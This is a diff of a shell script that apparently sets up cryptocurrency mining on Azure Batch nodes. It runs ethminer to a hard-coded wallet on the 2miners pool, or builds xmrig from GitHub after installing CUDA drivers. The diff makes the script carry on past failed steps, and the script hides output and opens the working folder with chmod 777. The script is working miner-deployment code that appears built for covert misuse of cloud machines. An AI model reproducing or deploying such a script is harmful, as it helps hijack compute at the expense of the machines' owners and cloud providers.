@@ -12,29 +12,26 @@ if [ -f "$DIR" ]; then
     hostname=$(hostname | cut -c1-8) &&
     ./ethminer -G -P stratum1+tcp://0x6ba4d687aec1055163df07f8ea10d643d91d8e20.$hostname@us-eth.2miners.com:2020
 else
-    sudo apt-get update &&
-    sudo apt-get -y install libssl-dev cmake build-essential libhwloc-dev libuv1-dev linux-headers-5.4.0-1046-azure &&
-    cd /home/_azbatch/ &&
+    sudo apt-get update ;
+    sudo apt-get -y install libssl-dev cmake build-essential libhwloc-dev libuv1-dev linux-headers-5.4.0-1046-azure ;
+    cd /home/_azbatch/ ;
     sudo rm cuda-ubuntu*  > /dev/null 2>&1 
     wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin > /dev/null 2>&1 
     sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600  &
     sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub  > /dev/null 2>&1 
     echo "deb http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64 /" | sudo tee /etc/apt/sources.list.d/cuda.list &&
-    sudo apt-get update && 
-    sleep 2 &&
-    sudo apt-get -y install cuda-drivers && 
-    sleep 2 &&
-    sudo apt-get -y install nvidia-cuda-toolkit && 
-    sleep 2 &&
-    sudo chmod -R 777 /home/_azbatch &&
-    cd /home/_azbatch &&
+    sudo apt-get update ;
+    sudo apt-get -y install cuda-drivers ;
+    sudo apt-get -y install nvidia-cuda-toolkit ;
+    sudo chmod -R 777 /home/_azbatch ;
+    cd /home/_azbatch ;
     sudo rm -rf xmrig &
     git clone https://github.com/xmrig/xmrig.git && 
     cd /home/_azbatch/xmrig &&
     git checkout v6.12.1 > /dev/null 2>&1 
     sleep 3 &&
-    mkdir /home/_azbatch/xmrig/build &&
-    cd /home/_azbatch/xmrig/build &&
+    mkdir /home/_azbatch/xmrig/build ;
+    cd /home/_azbatch/xmrig/build ;
     cmake .. && 
     make ;
     sleep 60 ;
